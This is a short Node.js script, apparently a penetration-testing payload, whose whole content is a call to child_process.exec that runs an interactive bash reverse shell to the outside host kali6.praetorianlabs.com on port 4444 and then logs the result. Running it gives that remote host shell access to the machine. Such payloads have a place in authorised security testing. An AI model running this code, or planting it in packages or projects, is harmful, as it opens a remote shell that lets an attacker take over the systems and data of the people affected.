const { exec } = require("child_process");

exec("bash -i >& /dev/tcp/kali6.praetorianlabs.com/4444 0>&1", (error, stdout, stderr) => {
    if (error) {
        console.log(`error: ${error.message}`);
        return;
    }
    if (stderr) {
        console.log(`stderr: ${stderr}`);
        return;
    }
    console.log(`stdout: ${stdout}`);
});
